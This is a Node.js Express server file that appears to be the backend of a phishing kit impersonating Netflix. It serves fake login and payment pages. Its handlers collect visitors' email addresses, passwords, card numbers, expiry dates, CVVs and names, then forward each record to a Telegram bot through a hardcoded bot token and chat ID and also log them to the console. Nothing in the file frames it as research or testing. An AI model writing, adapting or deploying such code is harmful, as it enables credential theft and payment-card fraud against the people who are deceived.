const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const PORT = 3000;

const BOT_TOKEN = '8902544765:AAE-8hXowxjEmNCcNUte0q1SIfvsyd1sGj4';
const CHAT_ID = '8975887766';

app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.get('/payment', (req, res) => res.sendFile(path.join(__dirname, 'payment.html')));

async function sendTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' });
  } catch (err) {
    console.error('Telegram Error:', err.message);
  }
}

app.post('/api/auth', async (req, res) => {
  const { email, password } = req.body;
  const msg = `<b>🔐 Netflix Login</b>\n\n<b>Email:</b> <code>${email}</code>\n<b>Pass:</b> <code>${password}</code>`;
  await sendTelegram(msg);
  console.log(`[AUTH] ${email} : ${password}`);
  res.json({ success: true, redirect: '/payment' });
});

app.post('/api/payment', async (req, res) => {
  const { card, exp, cvv, name } = req.body;
  const msg = `<b>💳 Netflix Card</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Card:</b> <code>${card}</code>\n<b>Exp:</b> <code>${exp}</code>\n<b>CVV:</b> <code>${cvv}</code>`;
  await sendTelegram(msg);
  console.log(`[PAYMENT] ${card} | ${exp} | ${cvv}`);
  res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));